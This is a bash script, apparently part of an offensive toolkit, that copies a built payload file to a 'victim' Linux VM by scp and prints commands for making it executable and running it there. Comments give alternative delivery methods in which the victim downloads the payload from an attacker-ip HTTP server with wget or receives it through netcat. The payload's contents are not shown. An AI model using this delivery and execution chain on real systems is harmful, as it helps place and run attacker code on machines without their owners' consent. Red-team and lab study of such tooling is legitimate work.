#!/bin/bash
# deploy.sh — Transfer payload to victim Linux VM
# Usage: bash deploy.sh <victim-ip> [user]

VICTIM_IP="${1:?Usage: bash deploy.sh <victim-ip> [user]}"
USER="${2:-ubuntu}"
PAYLOAD="./dist/things.txt"
REMOTE_PATH="/tmp/things.txt"

if [ ! -f "$PAYLOAD" ]; then
    echo "[!] Payload not found at $PAYLOAD. Run build.py first."
    exit 1
fi

echo "[*] Transferring $PAYLOAD to ${USER}@${VICTIM_IP}:${REMOTE_PATH}..."
scp "$PAYLOAD" "${USER}@${VICTIM_IP}:${REMOTE_PATH}"

echo "[*] Done. On victim, run:"
echo "    chmod +x ${REMOTE_PATH} && ${REMOTE_PATH}"

# Alternative methods (uncomment as needed):
# Method 2: Python HTTP server on attacker
#   cd dist && python3 -m http.server 8000
#   # On victim: wget http://<attacker-ip>:8000/things.txt
#
# Method 3: netcat transfer
#   # Attacker: nc -lvp 5555 < dist/things.txt
#   # Victim:   nc <attacker-ip> 5555 > /tmp/things.txt
